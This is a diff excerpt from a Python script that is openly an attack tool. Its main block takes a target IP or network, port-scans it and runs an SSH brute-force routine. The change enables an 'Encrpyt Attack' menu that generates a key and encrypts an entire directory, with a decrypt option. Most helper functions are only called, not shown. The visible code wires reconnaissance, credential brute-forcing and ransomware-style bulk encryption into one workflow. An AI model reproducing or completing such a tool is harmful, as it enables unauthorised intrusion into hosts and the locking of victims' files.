@@ -203,34 +203,31 @@ def decrypt_directory(directory_path, key):
             decrypt_file(file_path, key) # Decrypt each file
     print("Directory has been decrypted!")
 
-# def menu():
-#     while True:
-#         print("\n~~~~~ Brute Force Attack ~~~~~")
-#         print("1. SSH Brute Force")
-#         print("2. Encrpyt Directory and all its contents")
-#         print("0. Exit")
-#         choice = input("Enter a number: ")
+def menu():
+    while True:
+        print("\n~~~~~ Encrpyt Attack ~~~~~")
+        print("1. Encrpyt Directory and all its contents")
+        print("2. Decrpyt Directory and all its contents")
+        print("0. Exit")
+        choice = input("Enter a number: ")
 
-#         if choice == "1":
-#             ssh_brute_force(target_ip)
-#         # elif choice == "2":
-#         #     write_key() # Generating a key
-#         #     key = load_key() # Load that generated key into "key" variable
-#         #     folder_path = input("Enter the folder path to encrypt: ")
-#         #     encrypt_directory(folder_path, key) # Encrypts the specified directory
-#         # elif choice == "5":
-#         #     key = load_key() # Loading the key
-#         #     folder_path = input("Enter the folder path to decrypt: ")
-#         #     decrypt_directory(folder_path, key) # Decrypt the specified directory
-#         elif choice == "0":
-#             print("(づ ◕‿◕ )づ Goodbye!")
-#             break
-#         else:
-#             print("\nง •̀_•́)ง Invalid number! ")
+        if choice == "1":
+            write_key() # Generating a key
+            key = load_key() # Load that generated key into "key" variable
+            folder_path = input("Enter the folder path to encrypt: ")
+            encrypt_directory(folder_path, key) # Encrypts the specified directory
+        elif choice == "2":
+            key = load_key() # Loading the key
+            folder_path = input("Enter the folder path to decrypt: ")
+            decrypt_directory(folder_path, key) # Decrypt the specified directory
+        elif choice == "0":
+            print("(づ ◕‿◕ )づ Goodbye!")
+            break
+        else:
+            print("\nง •̀_•́)ง Invalid number! ")
 
 if __name__ == "__main__":
-    # Prompt the user for target IP address
     target_ip = input("Enter the target IP address or network (e.g., 192.168.1.1 or 192.168.1.0/24): ")
-    # Ports scans
     icmp_ping_and_scan(target_ip, [22, 80, 443, 3389])
     ssh_brute_force(target_ip)
+    menu()
